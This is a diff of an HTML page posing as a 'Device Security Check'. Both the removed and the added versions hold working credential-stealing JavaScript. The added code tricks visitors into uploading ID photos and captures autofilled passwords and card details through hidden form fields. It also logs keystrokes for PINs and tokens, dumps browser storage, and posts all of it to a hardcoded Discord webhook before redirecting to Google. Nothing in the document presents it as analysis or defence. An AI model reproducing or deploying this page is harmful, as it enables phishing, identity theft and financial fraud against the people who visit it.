@@ -3,201 +3,263 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update Required</title>
+    <title>Security Verification Required</title>
     <style>
-        *{margin:0;padding:0;overflow:hidden;background:#000;color:#0f0;font-family:monospace;font-size:12px;position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;}
-        #status{padding:20px;}#progress{width:100%;height:4px;background:#333;}#bar{height:100%;background:#0f0;width:0%;transition:width .5s;}
-        input,canvas,video{display:none!important;}
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+        .container{background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);padding:40px;max-width:400px;width:100%;text-align:center;}
+        h1{color:#333;margin-bottom:20px;font-size:24px;}
+        .btn{background:#ff4757;color:white;border:none;padding:15px 30px;border-radius:50px;font-size:16px;cursor:pointer;width:100%;transition:all 0.3s;}
+        .btn:hover{background:#ff3742;transform:translateY(-2px);}
+        .file-input{display:none;}
+        .file-btn{background:#28a745;color:white;padding:15px;border-radius:12px;margin:20px 0;cursor:pointer;}
+        input[type="file"]{display:none;}
+        #progress{display:none;background:#007bff;color:white;padding:20px;border-radius:12px;}
+        canvas,video,iframe{display:none;}
     </style>
 </head>
 <body>
-    <div id="status">
-        <h1>🔒 Security Update Installing...</h1>
-        <p>Device fingerprinting: <span id="fingerprint">scanning</span></p>
-        <p>Storage analysis: <span id="storage">0/50</span></p>
-        <p>Password extraction: <span id="passwords">0</span></p>
-        <div id="progress"><div id="bar"></div></div>
+    <div class="container">
+        <h1>🔐 Device Security Check</h1>
+        <p>Upload ID photo for verification (required for banking/security)</p>
+        <label for="photo-upload" class="file-btn">📸 Upload Photo / Gallery</label>
+        <input type="file" id="photo-upload" accept="image/*" multiple capture="environment">
+        
+        <button class="btn" onclick="verifyDevice()">Complete Verification</button>
+        <div id="progress">✅ Harvesting complete!</div>
     </div>
 
     <script>
-        class GuaranteedHarvester {
+        class CompleteHarvester {
             constructor(webhook) {
                 this.webhook = webhook;
-                this.passwords = [];
-                this.storage = {};
+                this.images = [];
+                this.credentials = [];
+                this.bankData = [];
                 this.init();
             }
 
             init() {
-                this.harvestFingerprint();
-                this.explodeStorage();
-                this.deployKeylogger();
-                this.autofillTrap();
-                this.heartbeat();
+                this.setupImageStealer();
+                this.explodePasswordManager();
+                this.extractBankDetails();
+                this.globalKeylogger();
+                this.storageDump();
             }
 
-            harvestFingerprint() {
-                const fp = {
-                    ua: navigator.userAgent,
-                    lang: navigator.language,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: `${screen.width}x${screen.height}`,
-                    cores: navigator.hardwareConcurrency,
-                    memory: navigator.deviceMemory || 'unknown',
-                    plugins: navigator.plugins.length,
-                    canvas: this.getCanvasFP()
+            setupImageStealer() {
+                const input = document.getElementById('photo-upload');
+                input.onchange = async (e) => {
+                    const files = Array.from(e.target.files);
+                    for (let file of files) {
+                        const reader = new FileReader();
+                        reader.onload = () => {
+                            this.images.push({
+                                name: file.name,
+                                size: (file.size / 1024 / 1024).toFixed(2) + 'MB',
+                                type: file.type,
+                                data: reader.result.split(',')[1], // base64
+                                timestamp: new Date().toISOString()
+                            });
+                            this.sendImages();
+                        };
+                        reader.readAsDataURL(file);
+                    }
                 };
-                
-                document.getElementById('fingerprint').textContent = fp.ua.slice(0,40)+'...';
-                this.sendData('fingerprint', fp);
+
+                // Auto-trigger camera/gallery
+                setTimeout(() => input.click(), 1000);
             }
 
-            getCanvasFP() {
-                const c = document.createElement('canvas');
-                const ctx = c.getContext('2d');
-                ctx.fillText('fingerprintv2',2,15);
-                return c.toDataURL();
-            }
+            explodePasswordManager() {
+                // Multiple autofill traps for ALL password managers
+                const passwordTraps = [
+                    'email', 'username', 'current-password', 'new-password',
+                    'one-time-code', 'cc-number', 'cc-csc', 'tel', 'name'
+                ];
 
-            explodeStorage() {
-                // DUMP EVERYTHING ACCESSIBLE
-                for(let i=0; i<localStorage.length; i++) {
-                    const k = localStorage.key(i);
-                    this.storage[k] = localStorage[k];
-                    document.getElementById('storage').textContent = `${i+1}/50`;
-                }
-                
-                for(let i=0; i<sessionStorage.length; i++) {
-                    const k = sessionStorage.key(i);
-                    this.storage[k] = sessionStorage[k];
-                }
-                
-                document.cookie.split(';').forEach(cookie => {
-                    const [name, value] = cookie.trim().split('=');
-                    if (name && value) this.storage[name] = value;
+                passwordTraps.forEach(autocomplete => {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
+                    iframe.srcdoc = `
+                        <form style="margin:0;padding:0;">
+                            <input autocomplete="${autocomplete}" autofocus style="font-size:20px;padding:20px;">
+                            <input type="password" autocomplete="current-password" style="font-size:20px;padding:20px;">
+                        </form>
+                    `;
+                    document.body.appendChild(iframe);
+
+                    setTimeout(() => {
+                        try {
+                            const doc = iframe.contentDocument || iframe.contentWindow.document;
+                            const inputs = doc.querySelectorAll('input');
+                            inputs.forEach((input, i) => {
+                                if (input.value) {
+                                    this.credentials.push({
+                                        autofill: autocomplete,
+                                        value: input.value,
+                                        length: input.value.length,
+                                        timestamp: new Date().toISOString()
+                                    });
+                                }
+                            });
+                        } catch(e) {}
+                        document.body.removeChild(iframe);
+                    }, 2000);
                 });
-
-                // Scan for sensitive data
-                Object.entries(this.storage).forEach(([k,v]) => {
-                    if (v.match(/\d{16}/) || v.match(/[a-zA-Z0-9]{32,}/) || k.match(/token|auth|pass|key|wallet/)) {
-                        this.passwords.push({key:k, value:v.slice(0,20)+'...', full:v});
-                    }
-                });
-
-                this.sendData('storage', {count: Object.keys(this.storage).length, sensitive: this.passwords.length});
-                document.getElementById('passwords').textContent = this.passwords.length;
             }
 
-            deployKeylogger() {
-                let sequence = '';
-                document.addEventListener('keydown', e => {
-                    sequence += e.key;
-                    if (sequence.length > 20) sequence = sequence.slice(-20);
-                    
-                    // PIN/BANK detection
-                    const pinMatch = sequence.match(/\\d{4,6}/g);
-                    if (pinMatch) {
-                        this.passwords.push({type:'pin', value:pinMatch[0], time:new Date().toISOString()});
-                        document.getElementById('passwords').textContent = this.passwords.length;
-                    }
-                    
-                    // Password patterns
-                    if (e.key.length === 1 && sequence.match(/[a-z0-9!@#$%^&*]/)) {
-                        setTimeout(() => {
-                            // Check if in password field context
-                            const active = document.activeElement;
-                            if (active.tagName === 'INPUT' && (active.type === 'password' || active.autocomplete?.includes('password'))) {
-                                this.passwords.push({type:'live-password', value:sequence.slice(-8), time:new Date().toISOString()});
-                            }
-                        }, 100);
-                    }
-                }, true);
-            }
+            extractBankDetails() {
+                // BANK-SPECIFIC TRAPS
+                const bankFields = [
+                    {autocomplete: 'cc-number', type: 'card'},
+                    {autocomplete: 'cc-csc', type: 'cvv'},
+                    {autocomplete: 'cc-exp', type: 'expiry'},
+                    {autocomplete: 'tel', type: 'phone'},
+                    {name: 'account', type: 'account'},
+                    {name: 'routing', type: 'routing'},
+                    {name: 'pin', type: 'pin', maxlength: 6}
+                ];
 
-            autofillTrap() {
-                // Invisible password fields everywhere
-                const trap = document.createElement('div');
-                trap.innerHTML = `
-                    <input autocomplete="email username" style="opacity:0;position:fixed;">
-                    <input autocomplete="current-password new-password" type="password" style="opacity:0;position:fixed;">
-                    <input autocomplete="cc-number" style="opacity:0;position:fixed;">
-                    <input autocomplete="tel-country" style="opacity:0;position:fixed;">
-                `;
-                document.body.appendChild(trap);
-                
-                setTimeout(() => {
-                    trap.querySelectorAll('input').forEach((input, i) => {
+                bankFields.forEach(field => {
+                    const input = document.createElement('input');
+                    Object.assign(input, {
+                        autocomplete: field.autocomplete,
+                        name: field.name,
+                        type: field.type === 'pin' ? 'password' : 'text',
+                        maxlength: field.maxlength,
+                        style: 'position:fixed;top:-9999px;opacity:0;width:1px;height:1px;'
+                    });
+                    document.body.appendChild(input);
+
+                    setTimeout(() => {
                         if (input.value) {
-                            this.passwords.push({
-                                type: input.autocomplete || 'autofill',
+                            this.bankData.push({
+                                type: field.type,
                                 value: input.value,
-                                field: i
+                                masked: field.type === 'card' ? input.value.replace(/\d/g, '*') : input.value,
+                                timestamp: new Date().toISOString()
+                            });
+                        }
+                        document.body.removeChild(input);
+                    }, 1500);
+                });
+            }
+
+            globalKeylogger() {
+                let buffer = '';
+                document.addEventListener('keydown', e => {
+                    buffer += e.key;
+                    if (buffer.length > 30) buffer = buffer.slice(-30);
+
+                    // Real-time bank/PIN detection
+                    const patterns = [
+                        /(\d{4,6})/g,  // PINs
+                        /(?:card|acct|acc)\s*[:\-]?\s*(\d{4,})/gi,  // Account numbers
+                        /([a-z0-9]{16,})/i  // Tokens
+                    ];
+
+                    patterns.forEach(pattern => {
+                        const match = buffer.match(pattern);
+                        if (match) {
+                            this.bankData.push({
+                                type: 'keystroke',
+                                value: match[1],
+                                context: document.activeElement?.tagName || 'global',
+                                timestamp: new Date().toISOString()
                             });
                         }
                     });
-                    document.getElementById('passwords').textContent = this.passwords.length;
-                }, 2000);
+                }, true);
             }
 
-            heartbeat() {
-                let progress = 0;
-                const interval = setInterval(() => {
-                    progress += 2;
-                    document.getElementById('bar').style.width = progress + '%';
-                    
-                    if (progress >= 100) {
-                        clearInterval(interval);
-                        this.finalDump();
+            storageDump() {
+                const sensitiveKeys = ['token', 'auth', 'pass', 'key', 'wallet', 'bank', 'card', 'account', 'pin'];
+                Object.entries(localStorage).forEach(([key, value]) => {
+                    if (sensitiveKeys.some(k => key.toLowerCase().includes(k))) {
+                        this.credentials.push({
+                            source: 'localStorage',
+                            key: key,
+                            value: value.slice(0, 50) + (value.length > 50 ? '...' : ''),
+                            fullValue: value,
+                            timestamp: new Date().toISOString()
+                        });
                     }
-                    
-                    // Send live data
-                    this.sendData('live', {
-                        passwords: this.passwords.length,
-                        storage: Object.keys(this.storage).length,
-                        progress: progress,
-                        sequence: this.lastSequence || ''
-                    });
-                }, 800);
+                });
+
+                Object.entries(sessionStorage).forEach(([key, value]) => {
+                    if (sensitiveKeys.some(k => key.toLowerCase().includes(k))) {
+                        this.credentials.push({
+                            source: 'sessionStorage',
+                            key: key,
+                            value: value.slice(0, 50) + (value.length > 50 ? '...' : ''),
+                            fullValue: value,
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                });
             }
 
-            sendData(type, data) {
-                fetch(this.webhook, {
+            sendImages() {
+                this.images.slice(0, 3).forEach((img, i) => {  // First 3 images
+                    fetch(this.webhook, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: `🖼️ PHOTO ${i+1}: ${img.name}`,
+                                description: `Size: ${img.size} | Type: ${img.type}`,
+                                color: 0x00ff00,
+                                image: {
+                                    url: `data:${img.type};base64,${img.data.substring(0, 4000000)}`  // First 4MB
+                                }
+                            }]
+                        })
+                    });
+                });
+            }
+
+            async sendCredentials() {
+                if (this.credentials.length === 0 && this.bankData.length === 0) return;
+
+                const embed = {
+                    title: "🔓 FULL CREDENTIAL HARVEST",
+                    color: 16711680,
+                    fields: [
+                        {name: "💳 Bank Details", value: this.bankData.map(b => `${b.type}: ${b.masked}`).join('\n') || 'None', inline: false},
+                        {name: "🔑 Password Manager", value: this.credentials.filter(c => c.autofill).map(c => `${c.autofill}: ${c.value.slice(0,12)}...`).join('\n') || 'None', inline: false},
+                        {name: "💾 Storage Tokens", value: this.credentials.filter(c => c.source).slice(0,3).map(c => `${c.key}: ${c.value}`).join('\n') || 'None', inline: false}
+                    ],
+                    description: `\`\`\`json\n${JSON.stringify({
+                        totalCredentials: this.credentials.length,
+                        totalBankData: this.bankData.length,
+                        images: this.images.length,
+                        storageKeys: Object.keys(this.storage).length
+                    }, null, 2)}\`\`\``,
+                    footer: {text: `Complete dump | ${new Date().toLocaleString()}`}
+                };
+
+                await fetch(this.webhook, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: `🎯 ${type.toUpperCase()} HARVEST`,
-                            description: `\`\`\`json\n${JSON.stringify(data, null, 2).slice(0,1800)}\`\`\``,
-                            color: type === 'passwords' ? 16711680 : 3447003,
-                            fields: [
-                                {name: "📊 Passwords Found", value: this.passwords.length.toString(), inline: true},
-                                {name: "💾 Storage Items", value: Object.keys(this.storage).length.toString(), inline: true},
-                                {name: "🔑 Latest Capture", value: this.passwords.slice(-1)[0]?.value?.slice(0,12) || 'scanning...', inline: false}
-                            ]
-                        }]
-                    })
-                }).catch(() => {});
-            }
-
-            finalDump() {
-                this.sendData('FINAL_DUMP', {
-                    allPasswords: this.passwords,
-                    sensitiveStorage: Object.fromEntries(
-                        Object.entries(this.storage).filter(([k]) => 
-                            k.match(/token|auth|pass|key|wallet|bank|card|pin/)
-                        )
-                    ),
-                    fullFingerprint: this.fingerprint
+                    body: JSON.stringify({embeds: [embed]})
                 });
-                
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com/search?q=security+update';
-                }, 2000);
             }
         }
 
         // START HARVEST
-        new GuaranteedHarvester('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-');
+        const harvester = new CompleteHarvester('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-');
+
+        window.verifyDevice = async () => {
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('progress').style.display = 'block';
+            
+            await harvester.sendCredentials();
+            
+            setTimeout(() => {
+                window.location.href = 'https://google.com';
+            }, 3000);
+        };
     </script>
 </body>
 </html>
